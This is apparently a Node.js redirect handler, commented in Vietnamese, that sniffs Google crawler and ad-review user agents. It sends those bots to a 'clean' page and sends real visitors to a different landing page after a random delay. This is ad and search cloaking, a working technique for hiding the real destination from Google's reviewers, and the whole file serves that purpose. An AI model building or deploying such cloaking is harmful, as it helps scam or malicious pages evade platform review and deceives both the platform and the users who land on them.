function isGoogleBot(userAgent) {
  return /\b(googlebot|adsbot-google|adsbot-google-mobile|adsbot-google-mobile-apps|mediapartners-google|googlebot-image|googlebot-news|googlebot-video|google-inspectiontool)\b/i.test(userAgent);
}

exports.handleRedirect = async (req, res) => {
  const ua = req.headers['user-agent'] || '';
  console.log('🔍 UA:', ua);

  const BOT_SAFE_PAGE_URL = process.env.BOT_SAFE_PAGE_URL;
  const LANDING_PAGE_URL = process.env.LANDING_PAGE_URL;

  if (isGoogleBot(ua)) {
    console.log('🤖 Bot Google phát hiện! UA:', ua); // Ghi log User-Agent bot để debug
    console.log('🤖 Bot Google ➜ redirect đến trang sạch');
    return res.redirect(302, BOT_SAFE_PAGE_URL);
  }

  // Thêm delay ngẫu nhiên 300–500ms khi redirect người dùng thật
  const delay = Math.floor(Math.random() * 201) + 300;
  console.log(`⏳ Delay redirect người dùng: ${delay}ms`);
  await new Promise(resolve => setTimeout(resolve, delay));

  console.log('🚶 Người dùng thật ➜ redirect đến landing page');
  return res.redirect(302, LANDING_PAGE_URL);
};
